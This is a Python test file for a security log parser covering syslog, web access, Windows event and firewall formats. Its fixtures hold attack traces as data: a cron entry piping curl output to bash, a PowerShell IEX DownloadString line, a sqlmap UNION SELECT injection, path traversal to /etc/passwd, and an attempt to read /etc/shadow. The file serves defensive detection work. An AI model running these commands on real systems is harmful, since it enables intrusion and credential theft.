import json
from datetime import datetime, timezone

from app.parsers import parse_text
from app.parsers.common import local_tz, parse_time, syslog_time

UTC = timezone.utc
NOW = datetime(2026, 11, 6, 12, 0, tzinfo=UTC)

AUTH_LOG = """\
Nov  6 10:15:01 web-01 sshd[1201]: Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2
Nov  6 10:15:03 web-01 sshd[1201]: message repeated 5 times: [ Failed password for root from 203.0.113.45 port 51130 ssh2]
Nov  6 10:15:04 web-01 sshd[1203]: Invalid user oracle from 203.0.113.45 port 51140
Nov  6 10:16:10 web-01 sshd[1210]: Accepted password for deploy from 203.0.113.45 port 51190 ssh2
Nov  6 10:17:00 web-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Nov  6 10:17:30 web-01 sudo:     bob : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Nov  6 10:18:00 web-01 useradd[1300]: new user: name=backup, UID=1002, GID=1002, home=/home/backup, shell=/bin/bash, from=/dev/pts/0
Nov  6 10:18:01 web-01 usermod[1301]: add 'backup' to group 'sudo'
Nov  6 10:19:00 web-01 CRON[1400]: (backup) CMD (curl -s http://198.51.100.200/u.sh | bash)
Nov  6 10:20:00 web-01 sshd[1500]: Did not receive identification string from 192.0.2.99 port 40000
Nov  6 10:21:00 web-01 kernel: [12345.678] [UFW BLOCK] IN=eth0 OUT= MAC=00:11 SRC=203.0.113.45 DST=10.0.1.10 LEN=44 TOS=0x00 PROTO=TCP SPT=40001 DPT=3306 WINDOW=1024 SYN URGP=0
Nov  6 10:22:00 web-01 systemd[1]: Started Daily apt download activities.
"""


def test_syslog_auth_and_firewall():
    res = parse_text(AUTH_LOG, UTC, NOW)
    assert res.format == "linux_syslog"
    kinds = [e.kind for e in res.events]
    assert kinds == ["auth_failure", "auth_failure", "auth_invalid_user", "auth_success", "sudo", "sudo", "user_created", "group_add", "cron", "ssh_probe", "fw_block"]
    fail, repeated = res.events[0], res.events[1]
    assert fail.user == "admin" and fail.fields["invalid_user"] and fail.src_ip == "203.0.113.45"
    assert repeated.count == 5 and repeated.user == "root"
    assert res.events[3].user == "deploy" and res.events[3].outcome == "success"
    assert res.events[4].fields["command"] == "/bin/bash" and res.events[4].fields["target_user"] == "root"
    assert res.events[5].outcome == "failure" and "incorrect password" in res.events[5].fields["error"]
    assert res.events[7].fields["group"] == "sudo"
    fw = res.events[-1]
    assert fw.source == "firewall" and fw.dst_port == 3306 and fw.fields["action"] == "block" and fw.dst_ip == "10.0.1.10"
    assert res.events[0].ts == datetime(2026, 11, 6, 10, 15, 1, tzinfo=UTC)
    assert res.lines == 12 and len(res.samples_skipped) == 1


def test_syslog_year_rolls_back_for_future_dates():
    ts = syslog_time("Dec", "31", "23:59:00", UTC, now=datetime(2027, 1, 2, tzinfo=UTC))
    assert ts.year == 2026


ACCESS_LOG = """\
198.51.100.7 - - [06/Nov/2026:10:15:01 +0530] "GET /index.html HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.45 - - [06/Nov/2026:10:16:01 +0530] "GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--%20 HTTP/1.1" 200 8812 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
203.0.113.45 - - [06/Nov/2026:10:16:02 +0530] "GET /download.php?file=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1" 200 1290 "-" "curl/8.5"
192.0.2.10 - - [06/Nov/2026:10:16:03 +0530] "\\x16\\x03\\x01" 400 157 "-" "-"
example.com:443 192.0.2.11 - alice [06/Nov/2026:10:16:04 +0530] "POST /login HTTP/2.0" 302 0 "https://example.com/" "Mozilla/5.0"
"""


def test_web_access_log():
    res = parse_text(ACCESS_LOG, UTC)
    assert res.format == "web_access" and len(res.events) == 5
    sqli = res.events[1]
    assert sqli.fields["status"] == 200 and "UNION SELECT" in sqli.fields["decoded"] and sqli.fields["user_agent"].startswith("sqlmap")
    assert sqli.ts == datetime(2026, 11, 6, 4, 46, 1, tzinfo=UTC)
    assert "../../../etc/passwd" in res.events[2].fields["decoded"]  # double-encoded
    assert res.events[3].kind == "http_malformed"
    assert res.events[4].host == "example.com" and res.events[4].user == "alice" and res.events[4].fields["method"] == "POST"


def test_windows_json_shapes():
    records = [
        {"Id": 4625, "TimeCreated": "/Date(1793952000000)/", "MachineName": "WS-FIN-07", "ProviderName": "Microsoft-Windows-Security-Auditing",
         "Message": "An account failed to log on.\n\nSubject:\n\tAccount Name:\t\t-\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tAdministrator\n\nLogon Type:\t\t\t3\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.23"},
        {"winlog": {"event_id": 4624, "computer_name": "WS-FIN-07", "event_data": {"TargetUserName": "a.sharma", "LogonType": "10", "IpAddress": "198.51.100.23"}},
         "@timestamp": "2026-11-06T09:00:00.000Z"},
        {"Event": {"System": {"EventID": 7045, "Computer": "WS-FIN-07", "TimeCreated": {"#attributes": {"SystemTime": "2026-11-06T09:05:00.1234567Z"}}},
                   "EventData": {"ServiceName": "WinUpdateSvc", "ImagePath": "C:\\Users\\Public\\svc.exe"}}},
        {"EventID": 4104, "TimeCreated": "2026-11-06T09:03:00Z", "Computer": "WS-FIN-07", "ProviderName": "Microsoft-Windows-PowerShell",
         "EventData": {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://update-check.example/a.ps1')"}},
        {"EventID": 4732, "TimeCreated": "2026-11-06T09:06:00Z", "Computer": "WS-FIN-07",
         "EventData": {"MemberName": "CN=support_adm,CN=Users,DC=corp", "TargetUserName": "Administrators", "SubjectUserName": "a.sharma"}},
    ]
    res = parse_text(json.dumps(records), UTC)
    assert res.format == "windows_json"
    failed, rdp, service, ps, group = res.events
    assert failed.kind == "auth_failure" and failed.user == "Administrator" and failed.src_ip == "198.51.100.23" and failed.fields["logon_type"] == 3
    assert failed.ts == datetime.fromtimestamp(1793952000, UTC)
    assert rdp.kind == "auth_success" and rdp.fields["logon_type_name"] == "remote desktop" and rdp.dst_port == 3389
    assert service.kind == "service_install" and service.fields["image_path"].endswith("svc.exe") and service.ts.minute == 5
    assert ps.kind == "powershell" and "DownloadString" in ps.fields["script"]
    assert group.kind == "group_add" and group.user == "support_adm" and group.fields["group"] == "Administrators"


def test_windows_json_lines_and_csv():
    lines = "\n".join(json.dumps({"EventID": 1102, "TimeCreated": "2026-11-06T09:10:00Z", "Computer": "WS-FIN-07", "SubjectUserName": "a.sharma"}) for _ in range(2))
    res = parse_text(lines, UTC)
    assert res.format == "windows_json" and [e.kind for e in res.events] == ["log_cleared", "log_cleared"]

    csv_text = 'Level,Date and Time,Source,Event ID,Task Category\nInformation,11/6/2026 9:00:00 AM,Microsoft-Windows-Security-Auditing,4720,User Account Management,"A user account was created.\n\nSubject:\n\tAccount Name:\t\ta.sharma\n\nNew Account:\n\tAccount Name:\t\tsupport_adm"\n'
    res = parse_text(csv_text, UTC)
    assert res.format == "windows_csv"
    assert res.events[0].kind == "user_created" and res.events[0].user == "support_adm"


def test_firewall_formats():
    pf = "#Version: 1.5\n#Software: Microsoft Windows Firewall\n#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path\n2026-11-06 10:00:01 DROP TCP 203.0.113.45 10.0.2.37 50001 445 52 S 0 0 64240 - - - RECEIVE\n2026-11-06 10:00:02 ALLOW TCP 10.0.2.37 198.51.100.200 50010 4444 0 - - - - - - - SEND\n"
    res = parse_text(pf, UTC)
    assert res.format == "windows_firewall"
    assert [e.kind for e in res.events] == ["fw_block", "fw_allow"] and res.events[1].fields["direction"] == "outbound"

    kv = 'date=2026-11-06 time=10:00:03 devname="FGT60F" srcip=203.0.113.45 srcport=40000 dstip=10.0.1.10 dstport=22 proto=6 action=deny policyid=0\n'
    res = parse_text(kv, UTC)
    assert res.format == "firewall_kv" and res.events[0].dst_port == 22 and res.events[0].fields["protocol"] == "TCP" and res.events[0].kind == "fw_block"

    csv_text = "timestamp,action,src_ip,dst_ip,dst_port,protocol\n2026-11-06T10:00:04Z,allow,10.0.1.10,198.51.100.200,4444,tcp\n"
    res = parse_text(csv_text, UTC)
    assert res.format == "firewall_csv" and res.events[0].kind == "fw_allow" and res.events[0].dst_port == 4444


def test_unknown_text_is_reported_not_crashing():
    res = parse_text("hello world\nthis is not a log\n", UTC)
    assert res.format is None and res.events == [] and res.samples_skipped


def test_time_parsing_variants():
    tz = local_tz("Asia/Kolkata")
    assert parse_time("2026-11-06 10:00:00", tz) == datetime(2026, 11, 6, 4, 30, tzinfo=UTC)
    assert parse_time("2026-11-06T10:00:00.1234567Z", tz) == datetime(2026, 11, 6, 10, 0, 0, 123456, tzinfo=UTC)
    assert parse_time(1793952000, tz) == datetime.fromtimestamp(1793952000, UTC)
    assert local_tz("Not/AZone") is not None
    assert parse_time("2026-11-06T10:00:00+0530", tz) == datetime(2026, 11, 6, 4, 30, tzinfo=UTC)
    assert parse_time("2026-11-06T10:00:00.12Z", tz) == datetime(2026, 11, 6, 10, 0, 0, 120000, tzinfo=UTC)


def test_journalctl_short_iso():
    res = parse_text("2026-11-06T10:15:01+0530 web-01 sshd[1201]: Accepted publickey for ravi from 10.0.0.5 port 50000 ssh2\n", UTC)
    assert res.events[0].kind == "auth_success" and res.events[0].ts == datetime(2026, 11, 6, 4, 45, 1, tzinfo=UTC)


EVTX_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>
<Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4625</EventID><TimeCreated SystemTime="2020-09-09 13:18:23.627951+00:00"></TimeCreated>
<Channel>Security</Channel><Computer>MSEDGEWIN10</Computer></System>
<EventData><Data Name="TargetUserName">IEUser</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">203.0.113.45</Data>
<Data Name="Status">0xc000006d</Data></EventData></Event>"""

EVTX_CLEARED = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>
<Provider Name="Microsoft-Windows-Eventlog"></Provider><EventID>1102</EventID><TimeCreated SystemTime="2020-09-09 14:00:00+00:00"></TimeCreated>
<Channel>Security</Channel><Computer>MSEDGEWIN10</Computer></System>
<UserData><LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog"><SubjectUserName>IEUser</SubjectUserName></LogFileCleared></UserData></Event>"""


def test_evtx_records_become_windows_events():
    from app.parsers.evtx import record_to_dict
    from app.parsers.windows import normalize

    ev = normalize(record_to_dict(EVTX_XML), UTC)
    assert ev.kind == "auth_failure" and ev.user == "IEUser" and ev.src_ip == "203.0.113.45" and ev.host == "MSEDGEWIN10"
    assert ev.fields["logon_type_name"] == "remote desktop" and ev.ts.year == 2020 and ev.raw.startswith("<Event")
    cleared = normalize(record_to_dict(EVTX_CLEARED), UTC)
    assert cleared.fields["event_id"] == 1102 and cleared.user == "IEUser"
    assert record_to_dict("<not xml") is None


def test_file_types_come_from_magic_bytes():
    from app.files import sniff

    assert sniff(b"MZ\x90\x00").startswith("Windows program")
    assert sniff(b"%PDF-1.7") == "PDF document"
    assert sniff(b"PK\x03\x04", ["[Content_Types].xml", "word/document.xml"]) == "Word document (DOCX)"
    assert sniff(b"plain old text") == "Text"
    assert sniff(b"\x00\x01\x02\xff\xfe") == "Unknown binary data"
